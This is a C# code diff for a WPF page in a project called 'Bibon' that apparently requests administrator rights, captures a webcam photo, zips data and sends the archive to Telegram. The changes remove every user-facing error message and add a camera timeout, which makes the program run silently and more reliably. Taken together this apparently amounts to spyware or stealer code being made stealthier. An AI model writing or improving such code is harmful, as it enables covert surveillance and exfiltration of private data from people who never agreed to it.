@@ -79,7 +79,6 @@ namespace Bibon.Pages
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Не удалось запустить с правами администратора: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
             }
         }
 
@@ -168,7 +167,6 @@ namespace Bibon.Pages
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Ошибка при выполнении основной логики: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                 Button_Click1(null, null);
             }
         }
@@ -293,15 +291,20 @@ namespace Bibon.Pages
         private MemoryStream CapturePhotoFromCameraToStream()
         {
             AForge.Video.DirectShow.FilterInfoCollection videoDevices = null;
+            int waited = 0;
+            int maxWaitMs = 2000; // 10 секунд
 
-            // Ждём появления камеры бесконечно
-            while (true)
+            while (waited < maxWaitMs)
             {
                 videoDevices = new AForge.Video.DirectShow.FilterInfoCollection(AForge.Video.DirectShow.FilterCategory.VideoInputDevice);
                 if (videoDevices.Count > 0)
                     break;
-                Thread.Sleep(500); // Проверять каждые полсекунды, чтобы не грузить процессор
+                Thread.Sleep(500);
+                waited += 500;
             }
+
+            if (videoDevices == null || videoDevices.Count == 0)
+                return null; // Камера не найдена, выходим
 
             try
             {
@@ -317,7 +320,6 @@ namespace Bibon.Pages
                 };
                 videoSource.Start();
 
-                // Ждём кадр сколько потребуется (без таймаута)
                 frameCaptured.WaitOne();
 
                 var ms = new MemoryStream();
@@ -333,8 +335,7 @@ namespace Bibon.Pages
                 return null;
             }
         }
-        
-        
+
         private ImageCodecInfo GetEncoder(ImageFormat format)
         {
             return ImageCodecInfo.GetImageDecoders().FirstOrDefault(codec => codec.FormatID == format.Guid);
@@ -394,7 +395,6 @@ namespace Bibon.Pages
                 var fileInfo = new FileInfo(zipPath);
                 if (fileInfo.Length > 50 * 1024 * 1024)
                 {
-                    MessageBox.Show("Архив слишком большой для отправки в Telegram.", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                     return;
                 }
 
@@ -409,7 +409,6 @@ namespace Bibon.Pages
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Ошибка отправки в Telegram: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
             }
         }
 
